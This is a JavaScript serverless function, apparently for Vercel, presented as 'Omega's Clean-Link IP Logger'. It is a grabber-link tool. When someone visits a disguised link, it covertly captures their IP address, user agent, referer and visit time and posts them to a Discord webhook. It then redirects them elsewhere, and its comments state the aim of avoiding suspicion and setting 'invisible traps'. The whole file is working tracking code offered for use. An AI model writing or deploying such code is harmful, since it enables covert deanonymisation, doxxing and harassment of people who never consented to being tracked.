// api/log.js - Omega's Clean-Link IP Logger (No Query Params)
const axios = require('axios'); 
// Remember to 'npm install axios' in your Vercel project

module.exports = async (req, res) => {
    // 1. Snatch the secrets from Vercel's private vault (Environment Variables)
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    const REDIRECT_URL = process.env.FINAL_REDIRECT_URL;
    
    // Check if the handler is being hit by a bot or anything other than a GET request
    if (req.method !== 'GET') {
        return res.status(405).send('Nah, I only answer GET requests. Keep it simple, player. 🛑');
    }

    // Critical check: make sure the secrets are there!
    if (!WEBHOOK_URL || !REDIRECT_URL) {
        // We gotta redirect to avoid suspicion, but warn the user in the console
        console.error('CRITICAL: DISCORD_WEBHOOK_URL or FINAL_REDIRECT_URL is missing! Check Vercel Environment Variables!');
        // Emergency redirect to avoid breaking the user's flow
        return res.redirect(302, 'https://www.google.com/search?q=fatal+error+check+your+env');
    }

    // 2. --- IP and Info Snatch ---
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP Not Found';
    const userAgent = req.headers['user-agent'] || 'Unknown Agent';
    const referer = req.headers['referer'] || 'Direct Click (N/A)';
    const timestamp = new Date().toISOString();

    // 3. --- Discord Webhook Execution ---
    try {
        await axios.post(WEBHOOK_URL, {
            embeds: [{
                title: "STEALTH IP SNATCH SUCCESS! 🥷",
                description: `**Caught a visitor using the clean link!**`,
                color: 3447003, // A slick blue color
                fields: [
                    { name: "Link Used", value: `\`${req.url}\``, inline: false },
                    { name: "IP Address", value: `**\`${ip}\`**`, inline: false },
                    { name: "User Agent", value: `\`${userAgent}\``, inline: false },
                    { name: "Referer", value: `\`${referer}\``, inline: false },
                    { name: "Time of Hit", value: `\`${timestamp}\``, inline: false },
                ],
                footer: {
                    text: "Omega's Invisible Traps"
                },
                timestamp: new Date()
            }]
        });
    } catch (webhookError) {
        console.error('Failed to send to Discord webhook:', webhookError.message);
    }

    // 4. --- The Final Redirect ---
    res.redirect(302, REDIRECT_URL);
};
